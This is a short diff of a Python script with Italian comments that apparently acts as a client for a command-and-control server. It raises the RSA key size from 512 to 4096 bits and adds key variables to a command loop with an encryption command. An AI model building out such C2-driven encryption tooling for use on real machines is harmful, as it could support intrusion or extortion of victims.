@@ -11,7 +11,7 @@ s.connect((HOST_CNC, PORT_CNC))
 
 # Funzioni
 def gen_pk():
-    publicKey, privateKey = rsa.newkeys(512)
+    publicKey, privateKey = rsa.newkeys(4096)
     return publicKey, privateKey
 
 def send_pk():
@@ -35,8 +35,10 @@ while True:
     # Inizializzazione comando
     cmd = command.split()[0].upper()
     
-    # Inizializzazione chiave [CIFRATURA SIMMETRICA]
+    # Inizializzazione chiavi
     sym_key = None
+  
+    private_key = None
     
     # Invia la chiave pubblica e crea la privata [CIFRATURA ASIMMETRICA]
     if cmd == "PKENC":
